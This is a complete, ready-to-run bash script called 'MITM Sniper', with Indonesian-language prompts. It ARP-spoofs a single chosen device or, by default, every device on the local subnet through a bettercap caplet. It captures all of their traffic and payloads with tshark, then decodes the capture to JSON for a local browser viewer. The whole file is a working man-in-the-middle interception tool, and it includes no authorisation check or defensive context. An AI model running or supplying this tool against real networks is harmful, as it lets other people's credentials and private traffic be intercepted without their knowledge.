#!/bin/bash

if [ -t 1 ]; then
  RESET='\033[0m'; BOLD='\033[1m'; DIM='\033[2m'
  RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[0;33m'
  BLUE='\033[0;34m'; MAGENTA='\033[0;35m'; CYAN='\033[0;36m'; WHITE='\033[0;37m'
  BR_RED='\033[1;31m'; BR_GREEN='\033[1;32m'; BR_YELLOW='\033[1;33m'
  BR_BLUE='\033[1;34m'; BR_CYAN='\033[1;36m'; BR_MAGENTA='\033[1;35m'
else
  RESET=''; BOLD=''; DIM=''; RED=''; GREEN=''; YELLOW=''; BLUE=''
  MAGENTA=''; CYAN=''; WHITE=''; BR_RED=''; BR_GREEN=''; BR_YELLOW=''
  BR_BLUE=''; BR_CYAN=''; BR_MAGENTA=''
fi

if [ "$EUID" -ne 0 ]; then
  echo -e "${BR_RED}✘ Jalankan pakai sudo!${RESET}"; exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TIMESTAMP="$(date +%Y%m%d_%H%M%S)"
CAPTURE_FILE="${SCRIPT_DIR}/capture_${TIMESTAMP}.pcap"
JSON_FILE="${SCRIPT_DIR}/capture.json"
VIEWER_FILE="${SCRIPT_DIR}/viewer.html"
PY_DECODER="${SCRIPT_DIR}/pcap2json.py"
TSHARK_LOG="${SCRIPT_DIR}/tshark.log"
CAPLET_FILE="/var/tmp/mitm_${TIMESTAMP}.cap"
HTTP_PORT=4040

clear
echo -e "${BR_CYAN}"
cat << "EOF"
   __  __ ___ _____ __  __   ____  _   _ ___ _____ _____ ____
  |  \/  |_ _|_   _|  \/  | / ___|| \ | |_ _|  ___| ____|  _ \
  | |\/| || |  | | | |\/| | \___ \|  \| || || |_  |  _| | |_) |
  | |  | || |  | | | |  | |  ___) | |\  || ||  _| | |___|  _ <
  |_|  |_|___| |_| |_|  |_| |____/|_| \_|___|_|   |_____|_| \_\
EOF
echo -e "${RESET}"
echo -e "                 ${BOLD}${WHITE}MITM Sniper${RESET}"
echo -e "        ${DIM}${CYAN}Full Detail Capture + Rich Viewer${RESET}"
echo -e "${BR_BLUE}════════════════════════════════════════════════════════════${RESET}"
echo

DEPS=(bettercap tshark xterm awk python3 ip ss)
MISSING=()
for cmd in "${DEPS[@]}"; do
  command -v "$cmd" &>/dev/null || MISSING+=("$cmd")
done
if [ ${#MISSING[@]} -gt 0 ]; then
  echo -e "${BR_RED}✘ Belum terinstal:${RESET} ${BOLD}${MISSING[*]}${RESET}"
  echo -e "${YELLOW}💡 ${BOLD}sudo pacman -S bettercap wireshark-qt xterm python iproute2${RESET}"
  exit 1
fi

for f in "$PY_DECODER" "$VIEWER_FILE"; do
  if [ ! -f "$f" ]; then
    echo -e "${BR_RED}✘ File ${BOLD}$(basename "$f")${RESET}${BR_RED} tidak ditemukan di ${SCRIPT_DIR}${RESET}"
    exit 1
  fi
done

echo -e "${BR_CYAN}[+] Interface:${RESET}"
while read -r iface state _; do
  echo -e "    ${BR_YELLOW}${iface}${RESET} ${DIM}(${state})${RESET}"
done < <(ip -br link show | awk '{print $1, $2, $3}')
echo
read -rp "$(echo -e "${BR_GREEN}👉 Interface ${DIM}(mis. wlan0)${RESET}: ")" IFACE
if ! ip link show "$IFACE" &>/dev/null; then
  echo -e "${BR_RED}✘ Interface ${BOLD}$IFACE${RESET}${BR_RED} tidak ditemukan.${RESET}"; exit 1
fi

echo
echo -e "${BR_CYAN}[+] Scan jaringan (7 detik)...${RESET}"
bettercap -iface "$IFACE" -eval "net.probe on; sleep 7; net.show; quit"

echo
echo -e "${BR_MAGENTA}━━━ Mode ━━━${RESET}"
echo -e "  ${DIM}• Target kosong → sniff ${BOLD}SEMUA${RESET}${DIM} di subnet${RESET}"
echo -e "  ${DIM}• Isi IP         → sniff ${BOLD}satu${RESET}${DIM} perangkat${RESET}"
echo
read -rp "$(echo -e "${BR_GREEN}👉 IP Target ${DIM}(kosong = SEMUA)${RESET}: ")" TARGET
read -rp "$(echo -e "${BR_GREEN}👉 IP Gateway ${DIM}(Enter = auto)${RESET}: ")" GATEWAY

if [ -z "$GATEWAY" ]; then
  GATEWAY=$(ip route | awk '/default/ {print $3; exit}')
  echo -e "${CYAN}ℹ  Gateway: ${BOLD}$GATEWAY${RESET}"
fi

SUBNET_CIDR=$(ip -o -f inet addr show "$IFACE" | awk '{print $4}' | head -n1)
SUBNET=$(echo "$SUBNET_CIDR" | cut -d/ -f1 | awk -F. '{print $1"."$2"."$3".0/24"}')

if [ -z "$TARGET" ]; then
  MODE="ALL"; MODE_DESC="SEMUA device di ${SUBNET}"; BPF_FILTER=""; BC_TARGETS=""
else
  MODE="SINGLE"; MODE_DESC="target ${TARGET}"; BPF_FILTER="host $TARGET"; BC_TARGETS="$TARGET"
fi

echo
echo -e "${BR_BLUE}════════════════════════════════════════════════════════════════${RESET}"
echo -e "  ${BOLD}Mode      ${RESET}: ${BR_GREEN}${MODE}${RESET} ${DIM}(${MODE_DESC})${RESET}"
echo -e "  ${BOLD}Interface ${RESET}: ${BR_YELLOW}${IFACE}${RESET}"
echo -e "  ${BOLD}Gateway   ${RESET}: ${BR_YELLOW}${GATEWAY}${RESET}"
echo -e "  ${BOLD}Subnet    ${RESET}: ${BR_YELLOW}${SUBNET}${RESET}"
echo -e "  ${BOLD}PCAP      ${RESET}: ${BR_CYAN}${CAPTURE_FILE}${RESET}"
echo -e "  ${BOLD}JSON      ${RESET}: ${BR_CYAN}${JSON_FILE}${RESET}"
echo -e "${BR_BLUE}════════════════════════════════════════════════════════════════${RESET}"
echo -e "${DIM}  ${BOLD}NO CAP${RESET}${DIM} — semua paket & payload disimpan full.${RESET}"
echo
read -rp "$(echo -e "${BR_YELLOW}▶ ENTER untuk mulai...${RESET}")"

{
  echo "# MITM Sniper caplet"
  [ "$MODE" = "SINGLE" ] && echo "set arp.spoof.targets ${BC_TARGETS}"
  echo "set arp.spoof.internal true"
  echo "set arp.spoof.fullduplex true"
  echo "arp.spoof on"
  echo "set net.sniff.verbose true"
  echo "set net.sniff.local true"
  echo "net.sniff on"
} > "$CAPLET_FILE"

xterm -title "Bettercap — MITM Sniper" \
  -bg black -fg "#33ff99" -fa "Monospace" -fs 10 -hold \
  -e "bettercap -iface $IFACE -caplet $CAPLET_FILE" &
XTERM_PID=$!
sleep 3

echo
echo -e "${BR_GREEN}[+] Memulai capture...${RESET}"

TSHARK_OUT="$CAPTURE_FILE"
NEED_MOVE=0
if id wireshark >/dev/null 2>&1; then
  TSHARK_OUT="/var/tmp/mitm_${TIMESTAMP}.pcap"
  NEED_MOVE=1
  echo -e "${DIM}  ℹ  user 'wireshark' → capture ke /var/tmp dulu${RESET}"
fi

run_tshark() {
  local out="$1"
  : > "$TSHARK_LOG"
  if [ -n "$BPF_FILTER" ]; then
    tshark -i "$IFACE" -n -w "$out" -f "$BPF_FILTER" 2>"$TSHARK_LOG" &
  else
    tshark -i "$IFACE" -n -w "$out" 2>"$TSHARK_LOG" &
  fi
  TSHARK_PID=$!
  sleep 2
  kill -0 "$TSHARK_PID" 2>/dev/null
}

if ! run_tshark "$TSHARK_OUT"; then
  if [ "$NEED_MOVE" -eq 0 ]; then
    echo -e "${BR_YELLOW}⚠ Fallback ke /var/tmp...${RESET}"
    TSHARK_OUT="/var/tmp/mitm_${TIMESTAMP}.pcap"; NEED_MOVE=1
    if ! run_tshark "$TSHARK_OUT"; then
      echo -e "${BR_RED}✘ tshark gagal:${RESET}"; cat "$TSHARK_LOG"
      kill "$XTERM_PID" 2>/dev/null; pkill -f "bettercap -iface $IFACE" 2>/dev/null
      rm -f "$CAPLET_FILE"; exit 1
    fi
  else
    echo -e "${BR_RED}✘ tshark gagal:${RESET}"; cat "$TSHARK_LOG"
    kill "$XTERM_PID" 2>/dev/null; pkill -f "bettercap -iface $IFACE" 2>/dev/null
    rm -f "$CAPLET_FILE"; exit 1
  fi
fi

echo -e "${BR_GREEN}[+] tshark PID ${TSHARK_PID} → ${TSHARK_OUT}${RESET}"
echo
read -rp "$(echo -e "${BR_YELLOW}⏸  ENTER untuk stop...${RESET}")"

echo
echo -e "${BR_CYAN}[+] Stop capture...${RESET}"
kill -INT "$TSHARK_PID" 2>/dev/null
for i in {1..20}; do kill -0 "$TSHARK_PID" 2>/dev/null || break; sleep 0.25; done
kill -0 "$TSHARK_PID" 2>/dev/null && { kill -TERM "$TSHARK_PID" 2>/dev/null; sleep 1; kill -KILL "$TSHARK_PID" 2>/dev/null; }
wait "$TSHARK_PID" 2>/dev/null

kill -TERM "$XTERM_PID" 2>/dev/null
pkill -f "bettercap -iface $IFACE" 2>/dev/null
sleep 2

echo -e "${BR_CYAN}[+] Restore ARP...${RESET}"
if [ "$MODE" = "SINGLE" ]; then
  bettercap -iface "$IFACE" -eval "set arp.spoof.targets ${TARGET}; arp.spoof off; quit" &>/dev/null
else
  bettercap -iface "$IFACE" -eval "arp.spoof off; quit" &>/dev/null
fi
echo -e "${BR_GREEN}✔ Jaringan normal kembali.${RESET}"
rm -f "$CAPLET_FILE"

if [ "$NEED_MOVE" -eq 1 ] && [ -f "$TSHARK_OUT" ]; then
  mv "$TSHARK_OUT" "$CAPTURE_FILE" 2>/dev/null && \
    echo -e "${BR_GREEN}✔ PCAP → ${CAPTURE_FILE}${RESET}" || CAPTURE_FILE="$TSHARK_OUT"
fi

if [ ! -s "$CAPTURE_FILE" ]; then
  echo -e "${BR_RED}✘ PCAP kosong / tidak ada.${RESET}"
  [ -s "$TSHARK_LOG" ] && cat "$TSHARK_LOG"; exit 1
fi

FILE_SIZE=$(du -h "$CAPTURE_FILE" | cut -f1)
echo -e "${BR_BLUE}  PCAP: ${BR_CYAN}${CAPTURE_FILE}${BR_BLUE} (${BR_GREEN}${FILE_SIZE}${BR_BLUE})${RESET}"

echo
echo -e "${BR_CYAN}[+] Decode pcap → JSON...${RESET}"
python3 "$PY_DECODER" "$CAPTURE_FILE" "$JSON_FILE" "$MODE" "$IFACE" "$GATEWAY" "$SUBNET"

if [ ! -f "$JSON_FILE" ]; then
  echo -e "${BR_RED}✘ Gagal generate JSON.${RESET}"; exit 1
fi

JSON_SIZE=$(du -h "$JSON_FILE" | cut -f1)
echo -e "${BR_GREEN}✔ JSON: ${BR_CYAN}${JSON_FILE}${RESET} ${DIM}(${JSON_SIZE})${RESET}"

echo
read -rp "$(echo -e "${BR_YELLOW}❓ Buka viewer di http://localhost:${HTTP_PORT}? [Y/n]: ${RESET}")" REVIEW
REVIEW=${REVIEW:-Y}

if [[ "$REVIEW" =~ ^[Yy]$ ]]; then
  cd "$SCRIPT_DIR" || exit 1
  if ss -tlnp 2>/dev/null | grep -q ":${HTTP_PORT} "; then
    echo -e "${BR_RED}✘ Port ${HTTP_PORT} sedang dipakai.${RESET}"
  else
    python3 -m http.server "$HTTP_PORT" --bind 127.0.0.1 &>/dev/null &
    HTTP_PID=$!
    sleep 1
    URL="http://localhost:${HTTP_PORT}/viewer.html"
    echo
    echo -e "${BR_GREEN}✔ HTTP server (PID ${HTTP_PID})${RESET}"
    echo -e "  ${DIM}Viewer :${RESET} ${BR_CYAN}${URL}${RESET}"
    echo -e "  ${DIM}JSON   :${RESET} ${BR_CYAN}http://localhost:${HTTP_PORT}/capture.json${RESET}"
    echo -e "  ${DIM}PCAP   :${RESET} ${BR_CYAN}http://localhost:${HTTP_PORT}/$(basename "$CAPTURE_FILE")${RESET}"
    echo
    command -v xdg-open &>/dev/null && xdg-open "$URL" &>/dev/null &
    echo -e "${DIM}  Tekan [ENTER] untuk stop server...${RESET}"
    read -r
    kill "$HTTP_PID" 2>/dev/null
    echo -e "${BR_GREEN}✔ HTTP server dihentikan.${RESET}"
  fi
fi

echo
echo -e "${BR_GREEN}${BOLD}✔ Selesai.${RESET}"
echo